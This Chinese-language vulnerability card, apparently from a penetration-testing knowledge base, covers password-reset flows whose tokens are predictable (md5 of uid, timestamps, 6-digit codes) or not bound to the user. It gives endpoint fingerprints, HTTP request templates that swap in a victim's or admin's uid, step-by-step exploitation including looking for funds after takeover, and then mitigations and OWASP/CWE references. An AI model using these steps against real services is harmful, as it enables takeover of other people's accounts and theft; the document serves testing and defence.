---
title: 密码重置 token 可预测 / 未绑定用户（任意用户改密）
cve: 无（业务逻辑）
severity: critical
cvss: 9.1
product: 自研找回密码流程
versions: 任意
ports: 80, 443
keywords: reset, token, 找回密码, 任意用户, 越权
entry: token = md5(uid) / 响应回显 / 不校验 uid
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
/api/user/findpwd        /api/user/resetPwd
/api/user/sendResetMail  /api/user/verifyToken
响应里可能出现 token / resetToken / uid
```

## 前置条件

- 两个自己名下的账号（A、B）；能收短信/邮件（或站内信）。

## PoC

```http
### 1) 请求重置，看 token 形态
POST /api/user/findpwd HTTP/1.1
Content-Type: application/json

{"phone":"13900000001"}

# 响应/后续链接里若出现 token：观察是否 = md5(uid)、= 时间戳、= 固定值

### 2) 带 uid 提交重置（典型越权点）
POST /api/user/resetPwd HTTP/1.1
Content-Type: application/json

{"uid":10002,"token":"<A 的 token>","newPwd":"Passw0rd!"}

### 3) 或直接改 uid 走验证
POST /api/user/verifyToken HTTP/1.1

{"uid":10002,"token":"<A 的 token>"}
```

## 利用步骤

1. 用 A 走一遍流程，记录 token 与请求里的 `uid`/`phone`。
2. 试 token 形态：`md5(uid)`、`md5(phone)`、时间戳、6 位数字（可爆破）。
3. 把 `uid` 换成 B / 管理员（常见 id=1），token 用 A 的：能重置即越权。
4. 若 token 与会话绑定：登出后重放，看是否仍有效（无状态 token 常见）。
5. 改密成功后登录目标账号，找资金/资料面；证据只留自己的两个账号。

## 修复与缓解

- token 服务端随机（≥128 bit）+ 单次有效 + 10 分钟过期 + 与 uid 一起签名（HMAC）。
- 重置接口以 token 解析出的 uid 为准，忽略请求体里的 uid。
- 改密后强制下线所有会话并通知用户。

## 参考

- OWASP Forgot Password Cheat Sheet；CWE-640。
